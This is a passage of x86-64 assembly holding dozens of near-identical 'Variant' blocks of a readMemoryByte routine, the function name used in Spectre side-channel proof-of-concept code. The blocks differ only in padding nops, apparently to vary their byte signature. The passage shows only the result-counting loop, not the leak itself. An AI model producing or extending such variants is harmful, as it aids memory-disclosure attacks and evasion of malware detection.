	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 72
.LreadMemoryByte_win3_var72:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 73
.LreadMemoryByte_win3_var73:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 74
.LreadMemoryByte_win3_var74:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 75
.LreadMemoryByte_win3_var75:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 76
.LreadMemoryByte_win3_var76:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 77
.LreadMemoryByte_win3_var77:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 78
.LreadMemoryByte_win3_var78:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 79
.LreadMemoryByte_win3_var79:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 80
.LreadMemoryByte_win3_var80:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 81
.LreadMemoryByte_win3_var81:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 82
.LreadMemoryByte_win3_var82:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 83
.LreadMemoryByte_win3_var83:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 84
.LreadMemoryByte_win3_var84:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 85
.LreadMemoryByte_win3_var85:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 86
.LreadMemoryByte_win3_var86:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 87
.LreadMemoryByte_win3_var87:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 88
.LreadMemoryByte_win3_var88:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 89
.LreadMemoryByte_win3_var89:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 90
.LreadMemoryByte_win3_var90:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 91
.LreadMemoryByte_win3_var91:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 92
.LreadMemoryByte_win3_var92:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 93
.LreadMemoryByte_win3_var93:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 94
.LreadMemoryByte_win3_var94:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 95
.LreadMemoryByte_win3_var95:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 96
.LreadMemoryByte_win3_var96:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 97
.LreadMemoryByte_win3_var97:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 98
.LreadMemoryByte_win3_var98:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 99
.LreadMemoryByte_win3_var99:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 100
.LreadMemoryByte_win3_var100:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 101
.LreadMemoryByte_win3_var101:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 102
.LreadMemoryByte_win3_var102:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 103
.LreadMemoryByte_win3_var103:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 104
.LreadMemoryByte_win3_var104:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 105
.LreadMemoryByte_win3_var105:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 106
.LreadMemoryByte_win3_var106:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 107
.LreadMemoryByte_win3_var107:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 108
.LreadMemoryByte_win3_var108:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 109
.LreadMemoryByte_win3_var109:
	popq	%rax
	nop
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 110
.LreadMemoryByte_win3_var110:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 111
.LreadMemoryByte_win3_var111:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 112
.LreadMemoryByte_win3_var112:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 113
.LreadMemoryByte_win3_var113:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 114
.LreadMemoryByte_win3_var114:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 115
.LreadMemoryByte_win3_var115:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 116
.LreadMemoryByte_win3_var116:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 117
.LreadMemoryByte_win3_var117:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 118
.LreadMemoryByte_win3_var118:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 119
.LreadMemoryByte_win3_var119:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 120
.LreadMemoryByte_win3_var120:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 121
.LreadMemoryByte_win3_var121:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 122
.LreadMemoryByte_win3_var122:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 123
.LreadMemoryByte_win3_var123:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 124
.LreadMemoryByte_win3_var124:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 125
.LreadMemoryByte_win3_var125:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 126
.LreadMemoryByte_win3_var126:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 127
.LreadMemoryByte_win3_var127:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 128
.LreadMemoryByte_win3_var128:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 129
.LreadMemoryByte_win3_var129:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 130
.LreadMemoryByte_win3_var130:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 131
.LreadMemoryByte_win3_var131:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 132
.LreadMemoryByte_win3_var132:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 133
.LreadMemoryByte_win3_var133:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 134
.LreadMemoryByte_win3_var134:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 135
.LreadMemoryByte_win3_var135:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 136
.LreadMemoryByte_win3_var136:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 137
.LreadMemoryByte_win3_var137:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 138
.LreadMemoryByte_win3_var138:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 139
.LreadMemoryByte_win3_var139:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 140
.LreadMemoryByte_win3_var140:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
